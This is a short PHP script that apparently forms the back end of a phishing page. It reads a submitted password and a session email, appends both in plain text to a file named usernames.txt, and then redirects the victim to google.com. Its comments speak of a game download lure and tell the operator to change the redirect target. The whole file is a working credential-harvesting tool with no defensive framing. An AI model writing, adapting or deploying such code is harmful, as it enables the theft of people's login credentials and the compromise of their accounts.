<?php

			session_start();
			
			$pass = $_POST["passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			//$file = fopen("usernames.txt") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
  			file_put_contents("usernames.txt", "[EMAIL]: " . $email . " [PASS]: " . $pass . "\n", FILE_APPEND);			
  			
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header('Location: https://www.google.com');
			exit();
			
			
			session_destroy();
			
?>